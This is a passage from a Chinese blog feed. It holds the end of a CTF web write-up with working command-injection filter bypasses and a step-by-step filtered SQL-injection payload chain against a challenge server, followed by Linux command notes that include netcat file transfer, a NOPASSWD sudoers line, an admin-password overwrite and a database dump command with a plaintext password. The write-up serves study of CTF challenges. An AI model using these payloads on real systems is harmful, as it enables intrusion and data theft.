anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里就是考查怎么绕过了 但是这里判断的条件还是比较松<br>在linux中命令中间有分隔符也可以照样执行命令比如<code>l&#39;&#39;s l/s</code>，还需要知道<code>tee</code>，这个指令会从标准输入读取数据，并将其同时输出到标准输出和一个或多个文件中<br>poc </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">?url=l&#x27;&#x27;s / | tee <span class="number">1.</span>txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#http://node4.anna.nssctf.cn:28754/1.txt</span></span><br><span class="line">a_here_is_a_f1ag</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flllllaaaaaaggggggg</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line"><span class="keyword">proc</span><span class="title"></span></span><br><span class="line"><span class="title">root</span></span><br><span class="line">run<span class="title"></span></span><br><span class="line"><span class="title">sbin</span></span><br><span class="line">srv<span class="title"></span></span><br><span class="line"><span class="title">sys</span></span><br><span class="line">tmp<span class="title"></span></span><br><span class="line"><span class="title">usr</span></span><br><span class="line">var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>除了直接用cat加上中间拼接单引号的方式，还有很多方式可以读flag，比如<code>tac</code>或者<code>nl</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://node4.anna.nssctf.cn:<span class="number">28754</span>/?url=tac%<span class="number">20</span>/a_here_is_a_f1ag%<span class="number">20</span>|%<span class="number">20</span>tee%<span class="number">202</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="attribute">true_flag_1s_1n_flllllaaaaaaggggggg</span></span><br></pre></td></tr></table></figure></div>
<p>但是la也被过滤了，所以需要在la中间加上&#x2F;或者上面的那些过滤符号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:<span class="number">28754</span>/?url=tac%<span class="number">20</span>/flllll\aaaaaaggggggg%<span class="number">20</span>|tee%<span class="number">203.</span>txt</span><br><span class="line"></span><br><span class="line">http://node4.anna.nssctf.cn:<span class="number">28754</span>/<span class="number">3.</span>txt</span><br><span class="line">NSSCTF&#123;bce2e219-<span class="number">42b3</span>-45a2-b6f6-529ead4e2a20&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">Want Me? Cross <span class="keyword">the</span> Waf</span><br><span class="line">球球你输入点东西吧！</span><br></pre></td></tr></table></figure></div>
<p>这里应该是要考查sql注入的绕过</p>
<p>直接输入?wllm&#x3D;1 没有报错 ?wllm&#x3D;1’ 报错<br>经过测试<code>#</code>是注释符，<code>--+</code>会报错，而且<code>--</code>不报错，说明+ 也就是空格被过滤了<br>空格可以用<code>/**/</code>代替，剩下的步骤就和之前做的sql注入题目一样了 <code>#</code>用url编码的%23代替<br>1.测字段数<br>?wllm&#x3D;1%27&#x2F;<strong>&#x2F;order&#x2F;</strong>&#x2F;by&#x2F;<strong>&#x2F;3%23<br>?wllm&#x3D;1%27&#x2F;</strong>&#x2F;order&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;4%23<br>测到4的时候报错，说明有三列<br>2.爆库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:test_db</span><br></pre></td></tr></table></figure></div>
<p>3.爆表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information.<span class="keyword">schema</span>.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>
<p>这样子直接报错了，说明<code>=</code>被过滤了，可以用like绕过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">/?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="string">&#x27;test_db&#x27;</span>%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:LTLT_flag,users</span><br></pre></td></tr></table></figure></div>
<p>4.爆字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">/?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">columns</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span>%<span class="number">27</span>LTLT_flag%<span class="number">27</span>%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:id,flag</span><br></pre></td></tr></table></figure></div>
<p>5.爆值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(flag)<span class="comment">/**/</span>from<span class="comment">/**/</span>test_db.LTLT_flag%23</span><br><span class="line">NSSCTF&#123;<span class="number">68487</span>a7b-abb8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里读取的时候读取不全，但是substr被过滤了，要用mid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">MID</span> 函数是 SQL 中用来从一个字符串中提取子字符串的函数。它通常用于获取某个位置开始的子串，或者在特定长度的范围内提取字符。</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">mid</span>(group_concat(flag),<span class="number">20</span>,<span class="number">20</span>)<span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>test_db.LTLT_flag%<span class="number">23</span></span><br><span class="line"><span class="number">8</span><span class="number">-4</span>f86<span class="number">-8</span>ac0<span class="number">-4440e1</span>d0</span><br><span class="line"></span><br><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">mid</span>(group_concat(flag),<span class="number">40</span>,<span class="number">20</span>)<span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>test_db.LTLT_flag%<span class="number">23</span></span><br><span class="line">b59d&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#完整的flag NSSCTF&#123;68487a7b-abb8-4f86-8ac0-4440e1d0b59d&#125;</span></span><br></pre></td></tr></table></figure></div>












]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>linux指令笔记</title>
    <url>/posts/49809.html</url>
    <content><![CDATA[<p>靶场或者平时遇到的linux指令记录</p>
<span id="more"></span>
<h1 id="Linux-常用指令笔记"><a href="#Linux-常用指令笔记" class="headerlink" title="Linux 常用指令笔记"></a>Linux 常用指令笔记</h1><h2 id="awk-文本处理工具"><a href="#awk-文本处理工具" class="headerlink" title="&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具"></a>&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</h2><p><strong>功能</strong>：逐行处理文本，自动分割字段（默认以空格&#x2F;Tab分隔）</p>
<h3 id="核心变量"><a href="#核心变量" class="headerlink" title="核心变量"></a>核心变量</h3><table>
<thead>
<tr>
<th>变量</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>整行内容</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>第一列</td>
</tr>
<tr>
<td><code>$2</code></td>
<td>第二列</td>
</tr>
<tr>
<td><code>...</code></td>
<td>…</td>
</tr>
<tr>
<td><code>$NF</code></td>
<td>最后一列</td>
</tr>
<tr>
<td><code>$NR</code></td>
<td>行数 （可以判断时候用 比如$NR %2 =&#x3D;0</td>
</tr>
</tbody></table>
<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-F</code></td>
<td>指定字段分隔符</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>指定外部脚本文件</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>传递外部变量到awk脚本</td>
</tr>
</tbody></table>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用逗号分隔符，打印第二列</span></span><br><span class="line"><span class="attribute">awk</span> -F <span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;</span> filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最后一列和整行</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print <span class="variable">$NF</span>, <span class="variable">$0</span>&#125;&#x27;</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件处理（打印第一列大于10的行）</span></span><br><span class="line">awk <span class="string">&#x27;<span class="variable">$1</span> &gt; 10 &#123;print <span class="variable">$0</span>&#125;&#x27;</span> data.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#提取每一行的最后一个字符 并且去掉换行</span></span><br><span class="line">cat a.txt | awk <span class="string">&#x27;&#123;print substr(<span class="variable">$0</span>,length(<span class="variable">$0</span>)-1,1)&#125;&#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="knockd-服务"><a href="#knockd-服务" class="headerlink" title="knockd 服务"></a>knockd 服务</h2><h3 id="配置文件：-etc-knockd-conf"><a href="#配置文件：-etc-knockd-conf" class="headerlink" title="配置文件：&#x2F;etc&#x2F;knockd.conf"></a>配置文件：&#x2F;etc&#x2F;knockd.conf</h3><h3 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h3><p>端口敲击服务，通过特定端口访问序列触发防火墙规则</p>
<h3 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按顺序敲击端口 1111,2222,3333</span></span><br><span class="line"><span class="attribute">knock</span> -v <span class="number">192.168.1.10</span> <span class="number">1111</span> <span class="number">2222</span> <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试端口开放情况</span></span><br><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span> <span class="number">192.168.1.10</span></span><br></pre></td></tr></table></figure></div>
<h2 id="grep-文本搜索工具"><a href="#grep-文本搜索工具" class="headerlink" title="grep 文本搜索工具"></a>grep 文本搜索工具</h2><h3 id="元字符表"><a href="#元字符表" class="headerlink" title="元字符表"></a>元字符表</h3><table>
<thead>
<tr>
<th>元字符</th>
<th>功能</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>行首定位符</td>
<td>^start</td>
</tr>
<tr>
<td>$</td>
<td>行尾定位符</td>
<td>end$</td>
</tr>
<tr>
<td>.*</td>
<td>任意字符（0 或多个）</td>
<td>a.*b</td>
</tr>
<tr>
<td>[]</td>
<td>字符集合匹配</td>
<td>[aeiou]</td>
</tr>
<tr>
<td>&lt;</td>
<td>单词开头</td>
<td>&lt;word</td>
</tr>
</tbody></table>
<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-E</td>
<td>使用扩展正则表达式（等价于 <code>grep -E</code> &#x3D; <code>egrep</code>）</td>
</tr>
<tr>
<td>-i</td>
<td>比较字符时忽略大小写</td>
</tr>
<tr>
<td>-w</td>
<td>只匹配完整的词，等价于正则中的 <code>\&lt;...\&gt;</code></td>
</tr>
<tr>
<td>-x</td>
<td>只匹配整行内容，等价于正则中的 <code>^...$</code></td>
</tr>
<tr>
<td>-v</td>
<td>取反，输出不符合模式的内容</td>
</tr>
<tr>
<td>-c</td>
<td>统计匹配到的行数（行数而非匹配的次数）</td>
</tr>
<tr>
<td>-m</td>
<td>只匹配规定的行数，之后不再继续匹配</td>
</tr>
<tr>
<td>-n</td>
<td>在输出结果中显示行号，指的是文件中原始的行号</td>
</tr>
<tr>
<td>-o</td>
<td>只显示匹配的部分，而非整行内容</td>
</tr>
<tr>
<td>-r</td>
<td>搜索所有文件，但不跟随符号链接</td>
</tr>
<tr>
<td>-R</td>
<td>递归搜索，适用于目录中的多个文件或目录</td>
</tr>
<tr>
<td>-B</td>
<td>输出匹配行之前的若干行，例如 <code>grep -B 3 &quot;aa&quot; file</code> 输出包含 “aa” 的行以及前 3 行</td>
</tr>
<tr>
<td>-A</td>
<td>输出匹配行之后的若干行</td>
</tr>
<tr>
<td>-C</td>
<td>同时显示匹配行的前后几行，等价于同时使用 <code>-B</code> 和 <code>-A</code></td>
</tr>
</tbody></table>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> -i <span class="string">&quot;hello&quot;</span> <span class="keyword">file</span>.txt # 忽略大小写查找</span><br><span class="line"><span class="keyword">grep</span> -n <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # 查找文件 <span class="keyword">file</span>.txt 中包含 <span class="string">&quot;pattern&quot;</span> 的行，并显示行号</span><br><span class="line"><span class="keyword">grep</span> -r <span class="string">&quot;pattern&quot;</span> /path/<span class="keyword">to</span>/directory/  # 在 /path/<span class="keyword">to</span>/directory 目录下递归查找包含 <span class="string">&quot;pattern&quot;</span> 的文件</span><br><span class="line"><span class="keyword">grep</span> -<span class="keyword">o</span> <span class="string">&quot;pattern&quot;</span> <span class="keyword">file</span>.txt # 在文件 <span class="keyword">file</span>.txt 中查找 <span class="string">&quot;pattern&quot;</span> 并只显示匹配到的部分</span><br><span class="line"><span class="keyword">grep</span> -v <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # 输出 <span class="built_in">log</span>.txt 中不包含 <span class="string">&quot;error&quot;</span> 的行</span><br><span class="line"><span class="keyword">grep</span> -A <span class="number">3</span> <span class="string">&quot;error&quot;</span> <span class="built_in">log</span>.txt # 在文件 <span class="built_in">log</span>.txt 中查找 <span class="string">&quot;error&quot;</span> 并显示该行以及之后的 <span class="number">3</span> 行</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h2 id="nc-Netcat-网络工具"><a href="#nc-Netcat-网络工具" class="headerlink" title="nc (Netcat) 网络工具"></a>nc (Netcat) 网络工具</h2><h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>监听模式</td>
</tr>
<tr>
<td>-v</td>
<td>显示详细信息</td>
</tr>
<tr>
<td>-n</td>
<td>禁用 DNS 解析</td>
</tr>
<tr>
<td>-p PORT</td>
<td>指定本地端口</td>
</tr>
<tr>
<td>-u</td>
<td>UDP 模式</td>
</tr>
<tr>
<td>-e CMD</td>
<td>连接后执行命令</td>
</tr>
<tr>
<td>-w TIME</td>
<td>设置连接超时，单位为秒</td>
</tr>
<tr>
<td>-z</td>
<td>扫描模式，不发送数据，只进行端口扫描</td>
</tr>
</tbody></table>
<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 监听端口 4444</span></span><br><span class="line"><span class="attribute">nc</span> -lp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送文件</span></span><br><span class="line"><span class="attribute">nc</span> -w <span class="number">3</span> <span class="number">192.168.1.100</span> <span class="number">4444</span> &lt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># UDP端口扫描</span></span><br><span class="line"><span class="attribute">nc</span> -zuv <span class="number">192.168.1.1</span> <span class="number">1</span>-<span class="number">1000</span></span><br></pre></td></tr></table></figure></div>
<h2 id="sudo-权限管理"><a href="#sudo-权限管理" class="headerlink" title="sudo 权限管理"></a>sudo 权限管理</h2><p><strong>配置文件</strong>：&#x2F;etc&#x2F;sudoers</p>
<h3 id="典型配置"><a href="#典型配置" class="headerlink" title="典型配置"></a>典型配置</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许用户免密码执行所有命令</span></span><br><span class="line">username <span class="literal">ALL</span>=(<span class="literal">ALL</span>) NOPASSWD: <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许组执行特定命令</span></span><br><span class="line">%<span class="literal">admin</span> <span class="literal">ALL</span>=/usr/bin/apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># root 用户可以在任何主机上、以任何用户身份以及任何组身份执行所有命令。</span></span><br><span class="line">root	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo 组的成员可以在任何主机上、以任何用户身份和任何组身份执行所有命令。</span></span><br><span class="line">%sudo	<span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br></pre></td></tr></table></figure></div>
<h2 id="drush-Drupal-Shell"><a href="#drush-Drupal-Shell" class="headerlink" title="drush (Drupal Shell)"></a>drush (Drupal Shell)</h2><p>(Drush &#x3D; Drupal + Shell) 就是使用命令行命令来操作 Drupal 站点，它的命令格式与 git 类似，都是双字命令（drush + 实际的命令）。为了使用 Drush，必须先告诉 Drush 要操作哪个站点，<strong>一个最直接的方法是将当前目录转到要想操作的站点目录下，Drush 就自动将操作应用于当前目录下的站点</strong>。<br>常用指令：<br><strong>启用模块 &#x2F; 禁用模块</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">drush en/dis project_name  </span><br><span class="line">drush pm-uninstall modulename <span class="comment">#先禁用再删除</span></span><br></pre></td></tr></table></figure></div>
<p><strong>卸载模块</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">drush pmu <span class="keyword">module</span> -y</span><br></pre></td></tr></table></figure></div>
<p><strong>数据库导出 （在导出之前 drush cc all）</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">drush <span class="keyword">sql</span>-dump &gt; DB.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump –gzip &gt; DB.tar.gz ### 导出数据库并压缩  </span><br><span class="line">mysqldump -p site &gt; db.<span class="keyword">sql</span>  </span><br><span class="line">drush <span class="keyword">sql</span>-dump &gt; db.<span class="keyword">sql</span> —gzip —result=/backups/example.<span class="keyword">sql</span>  </span><br><span class="line">mysqldump -h192<span class="number">.168</span><span class="number">.42</span><span class="number">.1</span> -uyuc -pQ5p94qAk47 –databases intg_hit &gt;hit.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure></div>
<p><strong>查看用户信息</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">drush <span class="keyword">user</span><span class="operator">-</span>information biaoge,maike  </span><br><span class="line">给 maike 一个 <span class="keyword">member</span> 的角色  </span><br><span class="line">drush urol <span class="keyword">member</span> maike</span><br></pre></td></tr></table></figure></div>
<p><strong>新建会员</strong>  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">drush ucrt zhangsan –<span class="attribute">password</span>=111111</span><br></pre></td></tr></table></figure></div>
<p><strong>创建新用户</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">drush user-create 用户名 --mail<span class="operator">=</span><span class="string">&quot;邮箱&quot;</span> --password<span class="operator">=</span><span class="string">&quot;密码&quot;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>修改密码</strong><br><code>php scripts/password-hash.sh &#39;yourpassword&#39;</code><br><code>drush upwd root --password=&quot;****&quot;</code><br><code>UPDATE users SET name=&#39;admin&#39;, pass=&#39;$S$DfQ/y58nGpZvyRLYd3LSyJ.s82xSC3Z.2oxdCIL4EHKAYcQnDl9T&#39; WHERE uid = 1**;</code><br><strong>drush -status</strong>   查看版本等信息</p>
<h2 id="scp-安全文件传输"><a href="#scp-安全文件传输" class="headerlink" title="scp 安全文件传输"></a>scp 安全文件传输</h2><p><code>scp</code> 是一个基于 SSH 协议的文件传输工具，用于在本地与远程主机之间或两台远程主机之间安全地拷贝文件。<code>scp</code> 的全称是 <strong>Secure Copy</strong>，它的用法与 <code>cp</code> 类似，但支持远程文件传输</p>
<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载远程文件</span></span><br><span class="line">scp user<span class="variable">@remote</span><span class="symbol">:/path/file</span>.txt local_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传目录（递归）</span></span><br><span class="line">scp -r local_dir user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">scp -P <span class="number">2222</span> file.txt user<span class="variable">@remote</span><span class="symbol">:/path/</span></span><br></pre></td></tr></table></figure></div>
<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p><code>ps</code> 是 Linux 和 Unix 系统中用于查看当前系统中运行的进程状态的命令。它是 <strong>Process Status</strong> 的缩写，提供系统中活动进程的信息</p>
<h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-e</code></td>
<td>显示所有进程。</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>全格式显示进程信息（包含父进程等信息）。</td>
</tr>
<tr>
<td><code>-u [user]</code></td>
<td>显示某个用户的进程。</td>
</tr>
<tr>
<td><code>-p [pid]</code></td>
<td>显示特定进程的详细信息。</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>显示所有终端相关的进程（不包括会话首进程）。</td>
</tr>
<tr>
<td><code>-x</code></td>
<td>显示没有控制终端的进程（后台进程）。</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>长格式显示进程信息。</td>
</tr>
<tr>
<td><code>--forest</code></td>
<td>显示进程的层级结构。</td>
</tr>
</tbody></table>
<p>一般用-ef</p>
<h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><p>访问文件的目录是&#x2F;var&#x2F;www&#x2F;html   访问记录在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p>cat指令反过来  让数据从最后一行开始颠倒  但是每行内容不变 适合题目给了一个passwords文件 从后面开始爆破</p>
<h2 id="var-mail"><a href="#var-mail" class="headerlink" title="&#x2F;var&#x2F;mail"></a>&#x2F;var&#x2F;mail</h2><p>存放用户邮件的地方 里面可能有有用的信息</p>
<h2 id="etc-release"><a href="#etc-release" class="headerlink" title="&#x2F;etc&#x2F;release"></a>&#x2F;etc&#x2F;release</h2><p>这个目录下有两个文件可以查看当前linux的版本信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>os-release: 包含全面的发行版信息，适用于大多数现代 Linux 发行版。</span><br><span class="line"><span class="regexp">/etc/i</span>ssue: 显示简短的版本信息，通常在登录时出现。</span><br><span class="line"><span class="regexp">/etc/</span>debian_version: 适用于基于 Debian 的系统，如 Ubuntu。</span><br><span class="line"><span class="regexp">/etc/</span>redhat-release: 适用于基于 RHEL 的系统，如 CentOS 和 Fedora。</span><br><span class="line"><span class="regexp">/etc/</span>centos-release: 适用于 CentOS 系统。</span><br><span class="line"><span class="regexp">/etc/</span>hostname: 显示主机名，而非版本信息</span><br></pre></td></tr></table></figure></div>

<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
